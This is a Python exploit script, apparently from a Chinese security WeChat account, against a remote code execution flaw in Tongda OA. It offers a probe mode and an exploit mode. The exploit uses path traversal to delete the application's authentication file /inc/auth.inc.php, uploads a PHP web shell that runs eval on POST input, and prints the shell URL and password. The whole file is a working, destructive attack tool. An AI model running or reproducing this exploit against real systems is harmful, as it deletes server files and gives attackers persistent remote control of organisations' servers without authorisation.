import requests
def poc(target):
    payload=target+"/module/appbuilder/assets/print.php"
    pocget=requests.get(payload).status_code
    if pocget==200:
        print("[+]该站点可能存在通达oa RCE漏洞")
    else:
        print("[-]该站点不存在通达oa RCE漏洞")
def exp(target):
    #可自定义shell内容
    shell="<?php eval($_POST['cmd']);?>"
    #用来删除的文件path
    delFileurl = target + "/module/appbuilder/assets/print.php"
    #判断用户是否登录的url
    userstatusFieUrl=target+"/inc/auth.inc.php"
    #删除请求
    delrequest = target + "/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
    #上传请求
    uploadrequest=target+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
    #判断漏洞是否存在
    body=requests.get(delFileurl).text
    if 'No input file specified.'  in body:
        print("[-]/module/appbuilder/assets/print.php文件不存在，漏洞利用失败可能不存在该漏洞")
        exit(1)
    print("[+]开始删除/inc/auth.inc.php文件")
    requests.get(delrequest)
    #判断文件是否被删除
    body = requests.get(userstatusFieUrl).text
    if 'No input file specified.' not in body:
        print("[-]无法删除 auth.inc.php")
        exit(-1)
    upload = {'FILE1': ('c.php', shell)}
    print("开始上传shell")
    requests.post(url=uploadrequest, files=upload)
    shellurl=target+"_c.php"
    if requests.get(shellurl).status_code==200:
        print("漏洞利用成功，shell地址"+shellurl+"密码为cmd")
    else:
        print("写入shell出错，可能不存在该漏洞")

if __name__ == '__main__':
    print('''
  _______ _____              _____   _____ ______ 
 |__   __|  __ \            |  __ \ / ____|  ____|
    | |  | |  | | ___   __ _| |__) | |    | |__   
    | |  | |  | |/ _ \ / _` |  _  /| |    |  __|  
    | |  | |__| | (_) | (_| | | \ \| |____| |____ 
    |_|  |_____/ \___/ \__,_|_|  \_\\_____|______|                                                    
                                    by公众号：信安灯塔
                                    (仅POC无损exp并非无损)
    ''')
target=input("输入目标url：")
to=input("无损poc测试请输入p(误报几率大)"
         "getshell输入e：")
if to=="p":
    poc(target)
elif to=="e":
    exp(target)
else:
    print("exit")
